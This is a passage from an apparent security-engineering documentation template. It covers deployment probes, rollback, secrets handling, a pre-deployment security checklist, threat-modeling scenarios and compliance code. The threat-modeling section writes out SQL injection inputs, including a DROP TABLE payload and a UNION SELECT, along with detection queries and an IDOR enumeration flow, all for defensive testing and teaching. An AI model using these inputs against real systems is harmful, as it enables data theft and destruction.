        status_code=status_code,
        content={
            "status": "healthy" if all_healthy else "degraded",
            "checks": checks,
            "timestamp": datetime.utcnow()
        }
    )

def check_database_connection():
    try:
        db.execute("SELECT 1")
        return {"status": "healthy", "latency_ms": 5}
    except Exception as e:
        return {"status": "unhealthy", "error": str(e)}

def check_redis_connection():
    try:
        redis_client.ping()
        return {"status": "healthy"}
    except Exception as e:
        return {"status": "unhealthy", "error": str(e)}
```

**Kubernetes Probe Configuration**:
```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: [service]
    image: [registry]/[service]:[version]

    # Liveness probe: Restart pod if failing
    livenessProbe:
      httpGet:
        path: /health
        port: 8080
      initialDelaySeconds: 30   # Wait 30s after start
      periodSeconds: 10         # Check every 10s
      timeoutSeconds: 5         # Timeout after 5s
      failureThreshold: 3       # Restart after 3 failures

    # Readiness probe: Remove from load balancer if failing
    readinessProbe:
      httpGet:
        path: /api/v1/healthz
        port: 8080
      initialDelaySeconds: 10
      periodSeconds: 5
      timeoutSeconds: 3
      failureThreshold: 2       # Remove after 2 failures
      successThreshold: 1       # Add back after 1 success

    # Startup probe: For slow-starting applications
    startupProbe:
      httpGet:
        path: /health
        port: 8080
      initialDelaySeconds: 0
      periodSeconds: 5
      failureThreshold: 30      # Allow 150s (30*5) for startup
```
```

---

### 12.4 Rollback Procedures

**Template Instructions**: MANDATORY rollback plan for production deployments.

**Example Structure**:
```markdown
### Rollback Strategy

**Automated Rollback Triggers**:
- Error rate >1% for 5 minutes
- p99 latency >1000ms for 5 minutes
- Health check failures >50% of instances
- Any CRITICAL alerts firing

**Manual Rollback Procedure**:
```bash
# 1. Identify last known good version
[deployment-tool] list-deployments --service=[service] --limit=5

# 2. Rollback to previous version
[deployment-tool] rollback [service] --to-revision=[N]

# 3. Verify rollback
curl https://[service].com/health
curl https://[service].com/api/v1/healthz

# 4. Check metrics
[monitoring-tool] dashboard --service=[service] --time=last-30m

# 5. Alert team
[incident-tool] create-incident \
  --title="Rolled back [service] to revision [N]" \
  --severity=high \
  --details="Reason: [reason]"
```

**Rollback Time Targets**:
| Severity | Target Rollback Time | Notification |
|----------|---------------------|---------------|
| CRITICAL (service down) | <5 minutes | Page on-call engineer |
| HIGH (errors >5%) | <15 minutes | Alert team channel |
| MEDIUM (degraded perf) | <30 minutes | Create incident ticket |

**Database Rollback** (CRITICAL):
```markdown
⚠️ **NEVER rollback database migrations automatically**

**Manual Database Rollback Process**:
1. Stop application traffic (maintenance mode)
2. Restore database from backup (if data loss is acceptable)
   OR
3. Run down migration carefully (if reversible)
4. Verify data integrity
5. Deploy previous application version
6. Resume traffic
```
```

---

### 12.5 Environment Configuration

**Template Instructions**: Define environment-specific configuration management.

**Example Structure**:
```markdown
### Environment Configuration

**Configuration Sources** (Priority Order):
1. Environment variables (highest priority)
2. Secrets manager (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault)
3. Configuration files (lowest priority)

**Environment Variables**:
```bash
# Required environment variables
export DATABASE_URL="postgresql://user:pass@host:5432/db"
export REDIS_URL="redis://host:6379/0"
export SECRET_KEY="[from-secrets-manager]"
export LOG_LEVEL="info"  # debug, info, warning, error
export ENVIRONMENT="production"  # development, staging, production
export PORT="8080"

# Optional environment variables
export CACHE_TTL="300"  # Cache TTL in seconds
export MAX_CONNECTIONS="100"
export REQUEST_TIMEOUT="30"  # Request timeout in seconds
```

**Secrets Management**:
```[language]
# ✅ Load secrets from secrets manager at startup
import [secrets_manager_library]

def load_secrets():
    secrets_client = [secrets_manager].Client()

    # Fetch secret from AWS Secrets Manager
    secret = secrets_client.get_secret_value(
        SecretId='[service]/production'
    )

    # Parse secret JSON
    secret_dict = json.loads(secret['SecretString'])

    # Set as environment variables
    os.environ['DATABASE_PASSWORD'] = secret_dict['database_password']
    os.environ['API_KEY'] = secret_dict['api_key']
    os.environ['JWT_SECRET'] = secret_dict['jwt_secret']

# Call at application startup
load_secrets()
```

**Environment-Specific Configuration**:
```[language]
# config/[environment].yml
development:
  database:
    host: localhost
    port: 5432
  logging:
    level: debug
  features:
    rate_limiting: false  # Disabled in dev

staging:
  database:
    host: staging-db.internal
    port: 5432
  logging:
    level: info
  features:
    rate_limiting: true

production:
  database:
    host: prod-db.internal
    port: 5432
    pool_size: 20
    pool_timeout: 30
  logging:
    level: warning
  features:
    rate_limiting: true
    security_headers: true
```
```

---

### 12.6 Infrastructure as Code

**Template Instructions**: Define infrastructure using IaC for reproducibility.

**Example Structure**:
```markdown
### Infrastructure Definition

**Tool**: [Terraform / CloudFormation / Pulumi / Kubernetes manifests]

**Infrastructure Components**:
```[iac_language]
# Terraform example
resource "[cloud_provider]_[resource]" "[service]" {
  name     = "[service]-production"
  location = "us-east-1"

  # Compute
  instance_type  = "t3.medium"
  min_instances  = 2
  max_instances  = 10

  # Networking
  vpc_id         = var.vpc_id
  subnet_ids     = var.private_subnet_ids
  security_groups = [aws_security_group.[service].id]

  # Storage
  database_instance_class = "db.t3.medium"
  allocated_storage       = 100  # GB
  backup_retention_period = 7    # days

  # High Availability
  multi_az = true  # MANDATORY for production

  # Tags
  tags = {
    Environment = "production"
    Service     = "[service]"
    ManagedBy   = "terraform"
  }
}
```

**Disaster Recovery**:
```[iac_language]
# Automated backups
backup_configuration:
  database:
    automated_backups: true
    retention_days: 30
    backup_window: "03:00-04:00"  # Low traffic window
    snapshot_frequency: daily

  volumes:
    snapshot_schedule: "0 2 * * *"  # 2 AM daily
    retention: 7

  disaster_recovery:
    rpo: 1h   # Recovery Point Objective: Max 1 hour data loss
    rto: 4h   # Recovery Time Objective: Max 4 hour downtime
```
```

---

## 13. Critical Reminders & Pre-Deployment Security Checklist

**Template Instructions**: Comprehensive checklist that MUST be completed before deployment.

**MANDATORY for ALL domains**:
- Security checklist (scaled by risk level)
- Pre-deployment verification
- Runtime monitoring requirements

**Example Structure**:
```markdown
## 13. Critical Reminders & Pre-Deployment Security Checklist

### NEVER (Security-Critical Items)

**NEVER commit these to production**:
1. ❌ **Hardcoded secrets** - Use environment variables or secret managers (AWS Secrets Manager, Azure Key Vault)
2. ❌ **Debug mode enabled** - Exposes stack traces, profiler, internal paths
3. ❌ **Default credentials** - Change all default passwords, API keys, database credentials
4. ❌ **Disabled security features** - Never disable CSRF, TLS verification, authentication for "convenience"
5. ❌ **Overly permissive access** - Follow principle of least privilege
6. ❌ **Unvalidated user input** - Validate at every trust boundary
7. ❌ **Exposed admin panels** - Protect with authentication + IP allowlist
8. ❌ **Weak cryptography** - No MD5, SHA1, DES, ECB mode, custom crypto
9. ❌ **PII/secrets in logs** - Never log passwords, tokens, API keys, personal data
10. ❌ **Running as root** - Use non-privileged users in containers and services

### ALWAYS (Security-Critical Items)

**ALWAYS implement before deployment**:
1. ✅ **Input validation on ALL user inputs** - Schema + business logic + output encoding
2. ✅ **Parameterized queries** - Never string concatenation for SQL/NoSQL
3. ✅ **Authentication & authorization** - Verify identity + permissions on protected resources
4. ✅ **HTTPS/TLS enforced** - Redirect HTTP → HTTPS, use TLS 1.2+ minimum
5. ✅ **Security headers configured** - CSP, HSTS, X-Frame-Options, X-Content-Type-Options
6. ✅ **Rate limiting on public endpoints** - Prevent abuse and DDoS
7. ✅ **Error handling with safe messages** - Log details internally, show generic messages to users
8. ✅ **Dependency vulnerability scanning** - No HIGH/CRITICAL vulnerabilities
9. ✅ **Security logging enabled** - Authentication, authorization, suspicious activity
10. ✅ **Secrets rotation plan** - Document rotation frequency and process

---

### Pre-Deployment Security Checklist

#### 🔐 Authentication & Authorization
- [ ] Authentication implemented on all protected endpoints
- [ ] Authorization checks enforce principle of least privilege
- [ ] Multi-factor authentication available (for high-risk domains)
- [ ] Session management secure (HTTP-only cookies, secure flag, SameSite)
- [ ] Password requirements enforce complexity (minimum 12 characters)
- [ ] Password hashing uses strong algorithm (Argon2id, bcrypt, PBKDF2)
- [ ] JWT tokens signed with strong algorithm (RS256, ES256, not HS256 with weak secret)
- [ ] Token expiration implemented (short-lived access tokens)
- [ ] Refresh token rotation implemented
- [ ] Account lockout after failed login attempts (rate limiting)

#### 🛡️ Input Validation & Injection Prevention
- [ ] All user inputs validated at API boundary (schema validation)
- [ ] Business logic validation enforced
- [ ] Parameterized queries used for all database access (no string concatenation)
- [ ] Command injection prevented (no shell=True with user input)
- [ ] Path traversal prevented (validate file paths)
- [ ] XSS prevented (context-aware output encoding)
- [ ] File upload restrictions (type, size, content validation)
- [ ] **File upload security (Section 5.3.6)**:
  - [ ] Magic byte validation (not just file extension)
  - [ ] Virus scanning enabled
  - [ ] Files stored outside webroot
  - [ ] Randomized filenames to prevent overwrites
- [ ] XML external entity (XXE) prevention (disable external entities)
- [ ] Deserialization attacks prevented (avoid unsafe deserialization)

#### 🔑 Secrets Management
- [ ] NO hardcoded secrets in source code
- [ ] NO secrets in git repository (verified with git-secrets, truffleHog)
- [ ] Environment variables used for local development
- [ ] Secret management service configured for production
- [ ] `.env` files in `.gitignore`
- [ ] `.env.example` provided (without real secrets)
- [ ] Secrets rotation schedule documented
- [ ] Secrets access logged for audit trail
- [ ] Principle of least privilege for secret access
- [ ] **Automated secret rotation (Section 5.4.3)**:
  - [ ] Grace period strategy implemented (dual-password support)
  - [ ] Zero-downtime rotation verified
  - [ ] Rotation frequency: databases (90d), API keys (30d), certificates (90d)
  - [ ] Automated rotation scripts tested

#### 🔒 Cryptography
- [ ] Strong password hashing (Argon2id > bcrypt > PBKDF2)
- [ ] Strong encryption (AES-256-GCM, ChaCha20-Poly1305)
- [ ] TLS 1.2+ enforced (prefer TLS 1.3)
- [ ] Strong TLS cipher suites configured
- [ ] Certificate validation enabled
- [ ] Cryptographically secure random (secrets module, os.urandom, not random)
- [ ] NO weak algorithms (MD5, SHA1, DES, 3DES, RC4)
- [ ] NO custom cryptography implementations

#### 🌐 Web Application Security (for web apps/APIs)
- [ ] HTTPS enforced (HTTP redirects to HTTPS)
- [ ] Security headers configured:
  - [ ] `Content-Security-Policy` - prevents XSS
  - [ ] `Strict-Transport-Security` - enforces HTTPS
  - [ ] `X-Frame-Options: DENY` - prevents clickjacking
  - [ ] `X-Content-Type-Options: nosniff` - prevents MIME sniffing
  - [ ] `X-XSS-Protection: 1; mode=block` - XSS filter
  - [ ] `Referrer-Policy: no-referrer` or `strict-origin-when-cross-origin`
- [ ] CORS configured restrictively (not `allow_origins=["*"]` with credentials)
- [ ] CSRF protection enabled
- [ ] Rate limiting implemented on all public endpoints
- [ ] Rate limiting stricter on authentication endpoints
- [ ] Request size limits enforced (prevent DoS)

#### 📊 Logging & Monitoring
- [ ] Structured logging implemented (JSON logs)
- [ ] Correlation IDs for request tracing
- [ ] NO PII in logs (or hashed)
- [ ] NO secrets in logs (passwords, tokens, API keys)
- [ ] Security events logged (authentication, authorization, suspicious activity)
- [ ] Log aggregation configured (ELK, Splunk, CloudWatch)
- [ ] Metrics collection implemented (RED: Rate, Errors, Duration)
- [ ] Monitoring dashboards created
- [ ] Alerting configured for:
  - [ ] High error rates
  - [ ] High latency (p95, p99)
  - [ ] Authentication failures
  - [ ] Authorization failures
  - [ ] Rate limit hits
  - [ ] Resource exhaustion (CPU, memory, disk)

#### 🧪 Testing & Scanning
- [ ] SAST (Static Application Security Testing) passing
- [ ] Dependency scanning passing (no HIGH/CRITICAL vulnerabilities)
- [ ] DAST (Dynamic Application Security Testing) completed (for web apps)
- [ ] Security tests passing (authentication, authorization, injection prevention)
- [ ] **Security regression tests (Section 6.1.5)**:
  - [ ] Every fixed vulnerability has a permanent test
  - [ ] Minimum 5 security regression tests exist
  - [ ] Tests tagged/organized in tests/security/regression/
- [ ] **Penetration testing (Section 6.6)**:
  - [ ] External pentest completed (quarterly for HIGH-risk)
  - [ ] All CRITICAL/HIGH findings remediated
  - [ ] Retest confirms fixes effective
- [ ] Unit tests >80% coverage
- [ ] Integration tests covering all external boundaries
- [ ] Performance tests completed (if applicable)
- [ ] Load tests completed (if high-traffic expected)

#### 🚀 Deployment & Infrastructure
- [ ] Debug mode DISABLED in production
- [ ] Default credentials changed (database, admin panels, etc.)
- [ ] Unnecessary services disabled
- [ ] Unnecessary ports closed
- [ ] Running as non-root user (containers and services)
- [ ] Container images scanned (Trivy, Grype)
- [ ] Minimal base images used (Alpine, distroless)
- [ ] **Zero Trust Architecture (Section 4.5)** (for HIGH-risk microservices):
  - [ ] Mutual TLS (mTLS) enforced between services
  - [ ] NetworkPolicy configured (default deny all)
  - [ ] Service mesh deployed (Istio/Linkerd/Consul)
  - [ ] Every request authenticated and authorized
- [ ] Network segmentation implemented
- [ ] Firewall rules configured (allowlist approach)
- [ ] Database access restricted (not publicly accessible)
- [ ] Admin panels protected (authentication + IP allowlist)
- [ ] Backup and disaster recovery tested
- [ ] **Incident response plan (Section 10.5)**:
  - [ ] Incident response playbook documented
  - [ ] On-call rotation configured
  - [ ] Runbooks created for P0/P1 incidents
  - [ ] MTTD targets defined (<5 min P0, <15 min P1)
  - [ ] MTTR targets defined (<1h P0, <4h P1)

#### 📜 Compliance (if applicable)
- [ ] **Data Privacy & Protection (Section 5.12)**:
  - [ ] Data classification completed (PII, PHI, PCI, etc.)
  - [ ] Encryption at rest for sensitive data (AES-256)
  - [ ] Encryption in transit (TLS 1.2+)
  - [ ] PII scrubbing from logs and error messages
- [ ] GDPR requirements met (if handling EU data)
  - [ ] Right to erasure implemented
  - [ ] Data portability implemented
  - [ ] Consent management implemented
  - [ ] Data retention policies enforced (auto-deletion)
- [ ] HIPAA requirements met (if handling PHI)
  - [ ] PHI encryption at rest and in transit
  - [ ] Audit trails for PHI access
  - [ ] BAA (Business Associate Agreement) signed
- [ ] PCI-DSS requirements met (if handling payment card data)
  - [ ] Cardholder data encrypted
  - [ ] PCI-compliant hosting
- [ ] Data retention policies enforced
- [ ] Privacy policy published and accurate

#### 🔒 Supply Chain Security (Section 8.4)
- [ ] **Dependency pinning**:
  - [ ] Exact versions pinned in lock files
  - [ ] Lock files committed to git
  - [ ] No floating versions (^, ~, >=)
- [ ] **SBOM (Software Bill of Materials)**:
  - [ ] SBOM generated for every build (CycloneDX/SPDX)
  - [ ] SBOM scanned for vulnerabilities
  - [ ] SBOM uploaded to artifact repository
- [ ] **Dependency verification**:
  - [ ] Package signatures verified
  - [ ] Checksums validated
  - [ ] Private registry configured (for critical systems)
- [ ] **Container security**:
  - [ ] Base images from trusted registries only
  - [ ] Image signatures verified
  - [ ] No latest/floating tags in production

#### 🚨 Runtime Security & Attack Detection (Section 5.11)
- [ ] **WAF (Web Application Firewall)** configured (for web apps):
  - [ ] OWASP ModSecurity Core Rule Set enabled
  - [ ] SQL injection rules active
  - [ ] XSS prevention rules active
  - [ ] Rate limiting rules configured
- [ ] **Runtime protection** (for HIGH-risk):
  - [ ] RASP (Runtime Application Self-Protection) enabled
  - [ ] Falco configured for container runtime monitoring
  - [ ] Anomaly detection alerts configured
- [ ] **SIEM integration**:
  - [ ] Security events forwarded to SIEM
  - [ ] Correlation rules configured
  - [ ] Alert thresholds tuned (reduce false positives)

#### 🔧 CI/CD Security Gates (Section 12.1.1)
- [ ] **Security gates implemented**:
  - [ ] Gate 1: Zero HIGH/CRITICAL vulnerabilities (blocks deployment)
  - [ ] Gate 2: Security tests passing
  - [ ] Gate 3: SBOM generated and scanned
  - [ ] Gate 4: Secrets detection (no leaks)
  - [ ] Gate 5: License compliance validated
  - [ ] Gate 6: Code quality thresholds met
- [ ] **CI/CD pipeline hardened**:
  - [ ] Pipeline fails on security gate failures (no manual overrides)
  - [ ] SBOM generation automated
  - [ ] Container image scanning in pipeline
  - [ ] Security gate metrics tracked (≥95% pass rate)

#### 📊 Security Metrics & KPIs (Section 0.13)
- [ ] **Vulnerability metrics tracked**:
  - [ ] MTTD (Mean Time to Detect): <24h for CRITICAL
  - [ ] MTTR (Mean Time to Remediate): <48h for CRITICAL
  - [ ] Open vulnerabilities: Zero CRITICAL, <5 HIGH
- [ ] **Security testing metrics tracked**:
  - [ ] Security test coverage: ≥90% for auth/authz/validation
  - [ ] Regression test count: 100% of bugs have tests
- [ ] **Security debt tracked**:
  - [ ] Security debt score calculated
  - [ ] Debt score <150 (MEDIUM or lower)
- [ ] **Dashboards configured**:
  - [ ] Security metrics dashboard (Grafana/Datadog)
  - [ ] Vulnerability window tracking
  - [ ] Security gate pass rates

---

### Runtime Checklist

**Monitor these continuously in production**:
- [ ] Error rates within SLO (< 0.1% for critical paths)
- [ ] Latency within SLO (p95 < [target]ms, p99 < [target]ms)
- [ ] Resource usage within limits (CPU < 70%, memory < 80%)
- [ ] Security alerts triaged within SLA
- [ ] Failed authentication attempts monitored (spike detection)
- [ ] Rate limiting effective (abuse attempts blocked)
- [ ] Log volume within expected range (spike may indicate attack)
- [ ] Certificate expiration monitoring (alert 30 days before expiry)
- [ ] Dependency vulnerabilities monitored (daily scans)

---

### Ongoing Maintenance

**Regular tasks to maintain security posture**:
- [ ] **Daily**: Review security alerts and failed authentication attempts
- [ ] **Daily**: Dependency vulnerability scans (automated)
- [ ] **Weekly**: Review logs for suspicious activity
- [ ] **Weekly**: Review and triage security findings from automated scans
- [ ] **Monthly**: Review and rotate secrets (at minimum)
- [ ] **Quarterly**: Security assessment (penetration testing or security review)
- [ ] **Quarterly**: Review access controls and permissions
- [ ] **Quarterly**: Update dependencies (patch versions)
- [ ] **Annually**: Security audit (third-party)
- [ ] **Annually**: Disaster recovery test
- [ ] **As needed**: Apply security patches (within SLA: Critical < 24h, High < 7 days)

---

### Domain-Specific Critical Reminders

**[Add domain-specific reminders here]**

For example:
- **Backend APIs**: Always implement rate limiting per endpoint and per user
- **Kubernetes**: Never run pods as root, always set SecurityContext
- **Mobile apps**: Implement certificate pinning for API calls
- **Data pipelines**: Validate data schemas at ingestion boundaries
- **Serverless functions**: Implement timeout limits, memory limits, concurrency limits
```

---

## 15. Threat Modeling & Attack Scenarios

**Template Instructions**: Required for HIGH-risk domains (5+ scenarios), recommended for MEDIUM-risk (3 scenarios).

**Example Structure**:
```markdown
## 15. Threat Modeling & Attack Scenarios

### Threat Model Overview for [Domain Name]

**Domain Risk Level**: [High/Medium/Low] (see Section 0.1)

**Assets to Protect**:
1. **[Asset 1]**: [Description] - **Sensitivity**: [Critical/High/Medium/Low]
2. **[Asset 2]**: [Description] - **Sensitivity**: [Critical/High/Medium/Low]
3. **[Asset 3]**: [Description] - **Sensitivity**: [Critical/High/Medium/Low]

**Threat Actors**:
1. **External Attackers** - Motivation: Financial gain, data theft - Capabilities: Automated scanning, SQL injection, credential stuffing
2. **Malicious Insiders** - Motivation: Data exfiltration, sabotage - Capabilities: Privileged access, knowledge of internal systems
3. **Script Kiddies** - Motivation: Opportunistic attacks - Capabilities: Using public exploits, automated tools
4. **Nation-State Actors** (if applicable) - Motivation: Espionage, disruption - Capabilities: Advanced persistent threats, zero-days

**Attack Surface**:
- Public-facing web application/API
- Authentication system
- Database
- Third-party integrations
- Admin interfaces
- [Domain-specific surfaces]

---

### Attack Scenario 1: [Attack Name - e.g., "SQL Injection via Search Parameter"]

**Threat Category**: OWASP A05:2025 - Injection / CWE-89

**Threat Level**: 🔴 Critical

**Attack Description**:
Attacker exploits insufficient input validation in the search functionality to inject malicious SQL queries, potentially accessing or modifying database contents.

**Preconditions**:
- Search endpoint accepts user input
- Input not properly validated/sanitized
- SQL queries use string concatenation

**Attack Flow**:
```
1. Attacker navigates to search functionality
2. Attacker inputs: `admin' OR '1'='1` in search field
3. Application constructs query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
4. Query returns all users (authentication bypass)
5. Attacker gains admin access
6. Attacker exfiltrates sensitive data or modifies records
```

**Impact**:
- **Confidentiality**: HIGH - Full database access, all user data exposed
- **Integrity**: HIGH - Attacker can modify/delete records
- **Availability**: MEDIUM - Attacker could drop tables (DoS)
- **Business Impact**: Data breach, regulatory fines, reputation damage

**Likelihood**: HIGH (if not mitigated) - SQL injection is consistently in OWASP Top 10, automated scanners test for this

**Mitigation**:

**Primary Control - Parameterized Queries**:
```[language]
# ✅ SECURE: Parameterized query
def search_users(search_term: str):
    # ORM handles parameterization automatically
    return db.query(User).filter(User.username.contains(search_term)).all()

    # Or with raw SQL using parameters:
    query = "SELECT * FROM users WHERE username LIKE ?"
    return db.execute(query, (f"%{search_term}%",)).fetchall()
```

**Additional Controls**:
- Input validation: Restrict search terms to alphanumeric characters
- Least privilege: Database user has read-only access (no DROP, DELETE permissions)
- WAF rules: Block common SQL injection patterns
- Rate limiting: Prevent automated scanning

**Detection**:
```python
# SAST detection
# Run: semgrep --config=p/sql-injection src/

# WAF logs showing SQL injection attempts
SELECT * FROM logs WHERE request_body LIKE '%OR 1=1%' OR request_body LIKE '%UNION SELECT%'

# Database query monitoring for suspicious patterns
SELECT query FROM pg_stat_activity WHERE query LIKE '%OR%=%'
```

**Testing**:
```python
def test_sql_injection_prevented():
    """Test that SQL injection attempts are safely handled."""
    malicious_inputs = [
        "admin' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --"
    ]

    for malicious in malicious_inputs:
        results = search_users(malicious)
        # Should return zero or safe results, not execute injection
        assert len(results) == 0 or all(malicious not in r.username for r in results)
```

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- [Domain-specific vulnerability advisory if applicable]

---

### Attack Scenario 2: [e.g., "Broken Access Control - IDOR (Insecure Direct Object Reference)"]

**Threat Category**: OWASP A01:2025 - Broken Access Control / CWE-639

**Threat Level**: 🔴 Critical / 🟠 High

**Attack Description**:
Attacker modifies resource IDs in API requests to access other users' data without proper authorization checks.

**Attack Flow**:
```
1. Attacker logs in as user with ID 123
2. Attacker accesses own profile: GET /api/users/123/profile (authorized)
3. Attacker changes ID to 456: GET /api/users/456/profile
4. Application returns user 456's profile data (no authorization check!)
5. Attacker enumerates all users (IDs 1-1000)
6. Attacker harvests PII, sensitive data
```

**Impact**:
- **Confidentiality**: HIGH - Unauthorized access to all user data
- **Integrity**: HIGH - If combined with PUT/DELETE, can modify other users' data
- **Availability**: LOW
- **Business Impact**: Privacy violation, GDPR fines, data breach

**Likelihood**: HIGH - Common vulnerability, easy to exploit, often missed in code reviews

**Mitigation**:

```[language]
# ❌ VULNERABLE: No authorization check
@app.get("/api/users/{user_id}/profile")
async def get_profile(user_id: int):
    return db.query(User).filter(User.id == user_id).first()

# ✅ SECURE: Authorization check
@app.get("/api/users/{user_id}/profile")
async def get_profile(user_id: int, current_user: User = Depends(get_current_user)):
    # Authorization: user can only access own profile (unless admin)
    if current_user.id != user_id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Access denied")

    return db.query(User).filter(User.id == user_id).first()
```

**Additional Controls**:
- Use UUIDs instead of sequential IDs (makes enumeration harder, but not sufficient on its own)
- Centralized authorization middleware
- Audit logging for access attempts

**Detection**:
```python
# Monitor for access pattern anomalies
SELECT user_id, COUNT(DISTINCT accessed_user_id) as distinct_accesses
FROM audit_log
WHERE action = 'profile_access'
GROUP BY user_id
HAVING COUNT(DISTINCT accessed_user_id) > 10  -- Suspicious enumeration
```

**Testing**:
```python
def test_user_cannot_access_other_users_data():
    user_a = create_user()
    user_b = create_user()

    response = client.get(
        f"/api/users/{user_b.id}/profile",
        headers={"Authorization": f"Bearer {user_a.token}"}
    )

    assert response.status_code == 403
```

---

### Attack Scenario 3-5: [Additional Scenarios]

[Repeat structure for 3-5 total attack scenarios based on domain risk level]

**Example Additional Scenarios**:
- Authentication Bypass via JWT Token Tampering (A07:2025)
- Cross-Site Scripting (XSS) via User-Generated Content (A05:2025)
- Server-Side Request Forgery (SSRF) via URL Parameter (A01:2025 - now part of Broken Access Control)
- Privilege Escalation via Role Manipulation (A01:2025)
- Denial of Service via Resource Exhaustion (A10:2025 - Mishandling of Exceptional Conditions)
- Software Supply Chain Attack via Malicious Dependency (A03:2025)

---

### STRIDE Analysis (Optional - for High-risk domains)

**STRIDE Threat Modeling Framework**:

| Category | Threats Identified | Mitigations | Priority |
|----------|-------------------|-------------|----------|
| **Spoofing** | Weak password policy, no MFA | Strong passwords + MFA, rate limiting | HIGH |
| **Tampering** | SQL injection, XSS, command injection | Parameterized queries, input validation, output encoding | CRITICAL |
| **Repudiation** | No audit logs for critical actions | Immutable audit logs, log authentication/authorization events | MEDIUM |
| **Information Disclosure** | Error messages leak stack traces | Safe error messages, log details internally only | HIGH |
| **Denial of Service** | No rate limiting, resource exhaustion | Rate limiting, request size limits, circuit breakers | MEDIUM |
| **Elevation of Privilege** | IDOR, broken access control | Resource-based authorization, principle of least privilege | CRITICAL |

---

### Security Testing Coverage for Threat Scenarios

**Automated Testing**:
- [ ] SAST scans detect injection vulnerabilities
- [ ] DAST scans test for authentication bypass
- [ ] Dependency scanning detects vulnerable libraries
- [ ] Fuzzing tests input handlers

**Manual Testing**:
- [ ] Penetration testing covers all attack scenarios (annually)
- [ ] Security code review for authorization logic
- [ ] Threat model review and update (quarterly)
```

---

## 16. Compliance & Regulatory Requirements

**Template Instructions**: Required for domains with regulatory requirements. Complete Section 16 if user confirms compliance needs (see Section 0.8).

**Example Structure**:
```markdown
## 16. Compliance & Regulatory Requirements

**Applicable Regulations**: [List all that apply: GDPR, HIPAA, PCI-DSS, SOC 2, ISO 27001, etc.]

---

### 16.1 Data Privacy Regulations

#### GDPR (General Data Protection Regulation) - if handling EU personal data

**Applicable**: ☑️ Yes / ☐ No / ☐ Uncertain

**Key Requirements**:

**1. Lawful Basis for Processing**:
- [ ] Consent obtained for data collection
- [ ] Privacy policy published and accessible
- [ ] Data processing documented (DPIA if high-risk)

**2. Data Subject Rights**:

**Right to Access (Article 15)**:
```[language]
@app.get("/api/users/{user_id}/data-export")
async def export_user_data(user_id: int, current_user: User = Depends(get_current_user)):
    """Export all user data in machine-readable format."""
    # Authorization check
    if current_user.id != user_id and not current_user.has_permission("gdpr_admin"):
        raise HTTPException(status_code=403, detail="Access denied")

    # Collect all user data from all systems
    user_data = {
        "personal_info": await get_user_profile(user_id),
        "activity_history": await get_user_activity(user_id),
        "preferences": await get_user_preferences(user_id),
        # Include data from all services
    }

    # Log the export
    await audit_log.log("gdpr.data_export", user_id=user_id, requester_id=current_user.id)

    return JSONResponse(content=user_data)
```

**Right to Erasure / "Right to be Forgotten" (Article 17)**:
```[language]
@app.delete("/api/users/{user_id}/gdpr-delete")
async def gdpr_delete_user(user_id: int, current_user: User = Depends(get_current_user)):
    """Delete all user data across all systems (GDPR right to erasure)."""
    # Authorization check
    if current_user.id != user_id and not current_user.has_permission("gdpr_admin"):
        raise HTTPException(status_code=403, detail="Access denied")

    # Cascade delete across all services
    await delete_user_profile(user_id)
    await delete_user_activity(user_id)
    await anonymize_user_analytics(user_id)  # Anonymize rather than delete analytics
    await invalidate_user_sessions(user_id)

    # Retain audit log for legal reasons (exempt from deletion)
    await audit_log.log("gdpr.data_deletion", user_id=user_id, requester_id=current_user.id, retention_exempt=True)

    return {"message": "User data deleted successfully", "user_id": user_id}
```

**Right to Data Portability (Article 20)**:
```[language]
# Same as data export above, but in structured format (JSON, CSV)
```

**3. Data Minimization**:
- [ ] Collect only necessary data
- [ ] Retention policies defined (delete data when no longer needed)
- [ ] Regular data cleanup jobs scheduled

**4. Security Measures**:
- [ ] Personal data encrypted at rest and in transit
- [ ] Access controls enforced (principle of least privilege)
- [ ] Breach notification process documented (72-hour reporting requirement)

**5. Data Processing Agreements (DPA)**:
- [ ] DPAs signed with all third-party processors
- [ ] Processors compliant with GDPR

---

#### CCPA (California Consumer Privacy Act) - if handling California residents' data

**Applicable**: ☑️ Yes / ☐ No

**Key Requirements**:
- Right to know what personal information is collected
- Right to delete personal information
- Right to opt-out of sale of personal information
- "Do Not Sell My Personal Information" link required

**Implementation**:
- Similar to GDPR data export/deletion endpoints
- Add opt-out mechanism for data sale (if applicable)

---

### 16.2 Healthcare Compliance

#### HIPAA (Health Insurance Portability and Accountability Act) - if handling PHI

**Applicable**: ☑️ Yes / ☐ No

**Key Requirements**:

**1. PHI Protection**:
- [ ] PHI encrypted at rest (AES-256)
- [ ] PHI encrypted in transit (TLS 1.2+)
- [ ] Access to PHI logged (audit trail)
- [ ] PHI de-identified when used for analytics

**2. Access Controls**:
```[language]
# Role-based access control for PHI
class PHIAccessControl:
    """Enforce HIPAA-compliant access controls for PHI."""

    def can_access_phi(self, user: User, patient_id: int) -> bool:
        # Only healthcare providers assigned to patient can access
        if user.role == "doctor" or user.role == "nurse":
            return patient_id in user.assigned_patients

        # Patients can access own PHI
        if user.role == "patient":
            return user.id == patient_id

        # Admins require specific PHI access permission + business justification
        if user.role == "admin" and user.has_permission("phi_access"):
            # Log admin access for audit
            audit_log.log("phi.admin_access", user_id=user.id, patient_id=patient_id)
            return True

        return False
```

**3. Audit Trails (HIPAA requires comprehensive audit logs)**:
```[language]
# Immutable audit log for PHI access
await audit_log.log(
    "phi.access",
    user_id=user.id,
    patient_id=patient.id,
    action="view_medical_record",
    timestamp=datetime.utcnow(),
    ip_address=hash_ip(request.client.host),
    justification="Treatment - routine checkup"
)
```

**4. Business Associate Agreements (BAA)**:
- [ ] BAAs signed with all third-party vendors handling PHI
- [ ] Vendors HIPAA-compliant

**5. Breach Notification**:
- [ ] Breach notification process documented
- [ ] Breaches reported to HHS within 60 days

---

### 16.3 Payment Card Industry

#### PCI-DSS (Payment Card Industry Data Security Standard) - if handling payment card data

**Applicable**: ☑️ Yes / ☐ No

**Key Requirements**:

**1. Never Store Sensitive Card Data**:
- ❌ NEVER store CVV, PIN, or full magnetic stripe data
- ❌ NEVER log full card numbers
- Use tokenization (Stripe, PayPal, etc.) to avoid handling raw card data

**2. If Storing Cardholder Data**:
- [ ] Primary Account Number (PAN) encrypted with strong cryptography
